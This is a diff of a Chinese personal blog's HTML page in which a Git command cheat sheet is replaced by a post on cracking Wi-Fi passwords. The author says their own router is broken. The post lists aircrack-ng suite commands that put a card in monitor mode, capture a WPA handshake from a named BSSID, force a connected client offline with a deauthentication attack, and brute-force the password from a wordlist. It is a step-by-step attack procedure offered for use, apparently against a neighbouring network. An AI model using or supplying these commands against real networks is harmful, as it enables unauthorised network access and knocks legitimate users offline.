@@ -4,26 +4,50 @@
 <head>
   <meta charset="UTF-8">
   
-    <title>GitHub 常用命令备忘录 | Anka9080&#39;s Notes</title>
+    <title>WIFI密码-破解命令 | Anka9080&#39;s Notes</title>
     <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
     
     <meta name="author" content="Anka9080">
     
 
     
-    <meta name="description" content="git init 把当前目录变成Git可以管理的仓库随后出现.git目录，这个目录是Git来跟踪管理版本库的git commit -m “change message” 提交代码到Gitgit add file1.txtgit add file2.txt 先添加多个文件 之后一起提交
-git status 命令可以让我们时刻掌握仓库当前的状态比如：文件是否被修改，修改后是否提交git diff r">
+    <meta name="description" content="自己路由器坏了，暂时也懒得修，想起还有一块无线网卡，直接爆破WIFI得了。
+使用虚拟机识别无线网卡的话注意两点：
+
+service.msc 开启 VM USB相关的服务
+虚拟机设置页面USB控制器的三个选项全都点上
+
+要不，要不插上网卡会没反应~~
+列出支持监控模式的网卡airmon-ng
+启用wlan0airmon-ng start wlan0
+列出所有的SSIDairodump-ng wlan">
 <meta property="og:type" content="article">
-<meta property="og:title" content="GitHub 常用命令备忘录">
-<meta property="og:url" content="http://www.evilclay.com/2015/07/10/github-cmd/index.html">
+<meta property="og:title" content="WIFI密码-破解命令">
+<meta property="og:url" content="http://www.evilclay.com/2017/02/21/WIFI密码-破解命令/index.html">
 <meta property="og:site_name" content="Anka9080's Notes">
-<meta property="og:description" content="git init 把当前目录变成Git可以管理的仓库随后出现.git目录，这个目录是Git来跟踪管理版本库的git commit -m “change message” 提交代码到Gitgit add file1.txtgit add file2.txt 先添加多个文件 之后一起提交
-git status 命令可以让我们时刻掌握仓库当前的状态比如：文件是否被修改，修改后是否提交git diff r">
-<meta property="og:updated_time" content="2016-05-28T09:43:46.604Z">
+<meta property="og:description" content="自己路由器坏了，暂时也懒得修，想起还有一块无线网卡，直接爆破WIFI得了。
+使用虚拟机识别无线网卡的话注意两点：
+
+service.msc 开启 VM USB相关的服务
+虚拟机设置页面USB控制器的三个选项全都点上
+
+要不，要不插上网卡会没反应~~
+列出支持监控模式的网卡airmon-ng
+启用wlan0airmon-ng start wlan0
+列出所有的SSIDairodump-ng wlan">
+<meta property="og:updated_time" content="2017-02-21T13:13:18.041Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="GitHub 常用命令备忘录">
-<meta name="twitter:description" content="git init 把当前目录变成Git可以管理的仓库随后出现.git目录，这个目录是Git来跟踪管理版本库的git commit -m “change message” 提交代码到Gitgit add file1.txtgit add file2.txt 先添加多个文件 之后一起提交
-git status 命令可以让我们时刻掌握仓库当前的状态比如：文件是否被修改，修改后是否提交git diff r">
+<meta name="twitter:title" content="WIFI密码-破解命令">
+<meta name="twitter:description" content="自己路由器坏了，暂时也懒得修，想起还有一块无线网卡，直接爆破WIFI得了。
+使用虚拟机识别无线网卡的话注意两点：
+
+service.msc 开启 VM USB相关的服务
+虚拟机设置页面USB控制器的三个选项全都点上
+
+要不，要不插上网卡会没反应~~
+列出支持监控模式的网卡airmon-ng
+启用wlan0airmon-ng start wlan0
+列出所有的SSIDairodump-ng wlan">
 
     
     <link rel="alternative" href="/atom.xml" title="Anka9080&#39;s Notes" type="application/atom+xml">
@@ -79,14 +103,14 @@ git status 命令可以让我们时刻掌握仓库当前的状态比如：文件
 		<header class="article-info clearfix">
   <h1 itemprop="name">
     
-      <a href="/2015/07/10/github-cmd/" title="GitHub 常用命令备忘录" itemprop="url">GitHub 常用命令备忘录</a>
+      <a href="/2017/02/21/WIFI密码-破解命令/" title="WIFI密码-破解命令" itemprop="url">WIFI密码-破解命令</a>
   </h1>
   <p class="article-author">By
        
 		<a href="/about" title="Anka9080" target="_blank" itemprop="author">Anka9080</a>
 		
   <p class="article-time">
-    <time datetime="2015-07-10T09:42:04.000Z" itemprop="datePublished"> 发表于 2015-07-10</time>
+    <time datetime="2017-02-21T13:08:39.000Z" itemprop="datePublished"> 发表于 2017-02-21</time>
     
   </p>
 </header>
@@ -95,35 +119,28 @@ git status 命令可以让我们时刻掌握仓库当前的状态比如：文件
 		<div id="toc" class="toc-article">
 			<strong class="toc-title">文章目录</strong>
 		
-			
+			<ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#列出支持监控模式的网卡"><span class="toc-number">1.</span> <span class="toc-text">列出支持监控模式的网卡</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#启用wlan0"><span class="toc-number">2.</span> <span class="toc-text">启用wlan0</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#列出所有的SSID"><span class="toc-number">3.</span> <span class="toc-text">列出所有的SSID</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#抓BSSID-20-F4-1B-B3-E5-12-信道2的握手包-能看到已经连接的客户端"><span class="toc-number">4.</span> <span class="toc-text">抓BSSID　20:F4:1B:B3:E5:12　信道2的握手包(能看到已经连接的客户端)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#强制BSSID20-F4-1B-B3-E5-12-客户端-B4-0B-44-91-74-B9-下线"><span class="toc-number">5.</span> <span class="toc-text">强制BSSID20:F4:1B:B3:E5:12　客户端　B4:0B:44:91:74:B9　下线</span></a></li></ol>
 		
 		</div>
 		
-		<p>git init 把当前目录变成Git可以管理的仓库<br>随后出现.git目录，这个目录是Git来跟踪管理版本库的<br>git commit -m “change message” 提交代码到Git<br>git add file1.txt<br>git add file2.txt 先添加多个文件 之后一起提交</p>
-<p>git status 命令可以让我们时刻掌握仓库当前的状态<br>比如：文件是否被修改，修改后是否提交<br>git diff readme.txt 查看这个文件上次修改具体改了那些内容</p>
-<p>git中的一次commit 是仓库的一个快照，一旦文件出现了差错，可以从最近的一个<br>commit恢复<br>git log 显示最近到最远的提交日志，用于回溯版本</p>
-<p>get reset –hard [HEAD^|commit id]</p>
-<p>git reflog 现实对版本库的各种操作记录，用于重返未来</p>
-<p>工作区：电脑里能看到的目录<br>版本库：.git（隐藏目录），Git的版本库<br>Git的版本库里有很多东西，其中最重要的就是stage（暂存区）+master<br>把文件往Git版本库里提交的时候，分两步执行：<br>git add 把 文件添加到暂存区<br>git commit 把暂存区的所有文件提交到当前分支</p>
-<p>一旦提交后，如果没有对工作区做任何修改，那么工作区的status就是“干净”的</p>
-<p>第一次修改-&gt;git add -&gt; 第二次修改 -&gt; git commit<br>git commit负责的是把暂存去的文件提交了，第二次修改的内容u会被提交。<br>正确步骤：第一次修改-&gt;git add -&gt; 第二次修改 -&gt; git add -&gt; git commit<br>git diff HEAD –readme.txt 查看工作区和版本库里面最新版本的区别</p>
-<p>git checkout –readme.txt 用版本库里的版本替换工作区的版本<br>有两种情况：<br>readme.txt 自修改后还没有放到缓存区，执行后会回到和版本库一模一样的状态。<br>readme.txt 已经添加到暂存区后，又做了修改，<br>总之，是让这个文件回到最近一次git commit 或 git add的状态</p>
-<p>git reset HEAD file 把暂存区的修改回退到工作区（unstage）</p>
-<p>git rm test.txt 删除版本库的test.txt文件</p>
-<p>git push -u origin master 将本地库所有的内容推送到远程库上</p>
-<p>git checkout -b dev 创建dev分支并切换<br>相当于下面两条命令：<br>git branch dev + git checkout dev<br>git branch 列出所有分支，当前分支会标*号<br>git checkout master 切换到master分支</p>
-<p>git merge dev 把dev分支的工作成功合并到master分支上<br>git branch -d dev 删除dev分支</p>
-<p>带参数的git log 看到分支的合并情况<br>git log –graph –pretty=oneline –abbrev-commit</p>
+		<p>自己路由器坏了，暂时也懒得修，想起还有一块无线网卡，直接爆破WIFI得了。</p>
+<p>使用虚拟机识别无线网卡的话注意两点：</p>
+<ol>
+<li>service.msc 开启 VM USB相关的服务</li>
+<li>虚拟机设置页面USB控制器的三个选项全都点上</li>
+</ol>
+<p>要不，要不插上网卡会没反应~~</p>
+<h4 id="列出支持监控模式的网卡"><a href="#列出支持监控模式的网卡" class="headerlink" title="列出支持监控模式的网卡"></a>列出支持监控模式的网卡</h4><p>airmon-ng</p>
+<h4 id="启用wlan0"><a href="#启用wlan0" class="headerlink" title="启用wlan0"></a>启用wlan0</h4><p>airmon-ng start wlan0</p>
+<h4 id="列出所有的SSID"><a href="#列出所有的SSID" class="headerlink" title="列出所有的SSID"></a>列出所有的SSID</h4><p>airodump-ng wlan0mon</p>
+<h4 id="抓BSSID-20-F4-1B-B3-E5-12-信道2的握手包-能看到已经连接的客户端"><a href="#抓BSSID-20-F4-1B-B3-E5-12-信道2的握手包-能看到已经连接的客户端" class="headerlink" title="抓BSSID　20:F4:1B:B3:E5:12　信道2的握手包(能看到已经连接的客户端)"></a>抓BSSID　20:F4:1B:B3:E5:12　信道2的握手包(能看到已经连接的客户端)</h4><p>airodump-ng -c 2 –bssid 20:F4:1B:B3:E5:12 -w ~/ wlan0mon</p>
+<h4 id="强制BSSID20-F4-1B-B3-E5-12-客户端-B4-0B-44-91-74-B9-下线"><a href="#强制BSSID20-F4-1B-B3-E5-12-客户端-B4-0B-44-91-74-B9-下线" class="headerlink" title="强制BSSID20:F4:1B:B3:E5:12　客户端　B4:0B:44:91:74:B9　下线"></a>强制BSSID20:F4:1B:B3:E5:12　客户端　B4:0B:44:91:74:B9　下线</h4><p>aireplay-ng -0 2 -a 20:F4:1B:B3:E5:12 -c B4:0B:44:91:74:B9 wlan0mon</p>
+<p>####　使用字典破解BSSID　20:F4:1B:B3:E5:12　的WIFI密码<br>aircrack-ng -a2 -b 20:F4:1B:B3:E5:12 -w ~/wifi-crack/pass.txt ~/wifi-crack/*.cap</p>
   
 	</div>
 		<footer class="article-footer clearfix">
 <div class="article-catetags">
 
-
-  <div class="article-tags">
-  
-  <span></span> <a href="/tags/GitHub/">GitHub</a>
-  </div>
 
 </div>
 
@@ -131,7 +148,7 @@ git status 命令可以让我们时刻掌握仓库当前的状态比如：文件
 
 	<div class="article-share" id="share">
 	
-	  <div data-url="http://www.evilclay.com/2015/07/10/github-cmd/" data-title="GitHub 常用命令备忘录 | Anka9080&#39;s Notes" data-tsina="null" class="share clearfix">
+	  <div data-url="http://www.evilclay.com/2017/02/21/WIFI密码-破解命令/" data-title="WIFI密码-破解命令 | Anka9080&#39;s Notes" data-tsina="null" class="share clearfix">
 	  </div>
 	
 	</div>
@@ -144,19 +161,11 @@ git status 命令可以让我们时刻掌握仓库当前的状态比如：文件
 	
 <nav class="article-nav clearfix">
  
- <div class="prev" >
- <a href="/2016/03/02/printer-hack/" title="HP 打印机 PCL 漏洞分析与利用">
-  <strong>上一篇：</strong><br/>
-  <span>
-  HP 打印机 PCL 漏洞分析与利用</span>
-</a>
-</div>
-
 
 <div class="next">
-<a href="/2015/06/10/python-spider-subdomain-ip/"  title="Python 爬虫获取指定主机子域名及IP信息">
+<a href="/2017/02/18/SQLALchemy问题调试的一点想法/"  title="SQLALchemy问题调试的一点想法">
  <strong>下一篇：</strong><br/> 
- <span>Python 爬虫获取指定主机子域名及IP信息
+ <span>SQLALchemy问题调试的一点想法
 </span>
 </a>
 </div>
@@ -165,7 +174,7 @@ git status 命令可以让我们时刻掌握仓库当前的状态比如：文件
 
 	
 <section id="comments" class="comment">
-	<div class="ds-thread" data-thread-key="2015/07/10/github-cmd/" data-title="GitHub 常用命令备忘录" data-url="http://www.evilclay.com/2015/07/10/github-cmd/"></div>
+	<div class="ds-thread" data-thread-key="2017/02/21/WIFI密码-破解命令/" data-title="WIFI密码-破解命令" data-url="http://www.evilclay.com/2017/02/21/WIFI密码-破解命令/"></div>
 </section>
 
 
@@ -175,7 +184,7 @@ git status 命令可以让我们时刻掌握仓库当前的状态比如：文件
   <div id="toc" class="toc-aside">
   <strong class="toc-title">文章目录</strong>
  
- 
+ <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#列出支持监控模式的网卡"><span class="toc-number">1.</span> <span class="toc-text">列出支持监控模式的网卡</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#启用wlan0"><span class="toc-number">2.</span> <span class="toc-text">启用wlan0</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#列出所有的SSID"><span class="toc-number">3.</span> <span class="toc-text">列出所有的SSID</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#抓BSSID-20-F4-1B-B3-E5-12-信道2的握手包-能看到已经连接的客户端"><span class="toc-number">4.</span> <span class="toc-text">抓BSSID　20:F4:1B:B3:E5:12　信道2的握手包(能看到已经连接的客户端)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#强制BSSID20-F4-1B-B3-E5-12-客户端-B4-0B-44-91-74-B9-下线"><span class="toc-number">5.</span> <span class="toc-text">强制BSSID20:F4:1B:B3:E5:12　客户端　B4:0B:44:91:74:B9　下线</span></a></li></ol>
  
   </div>
 
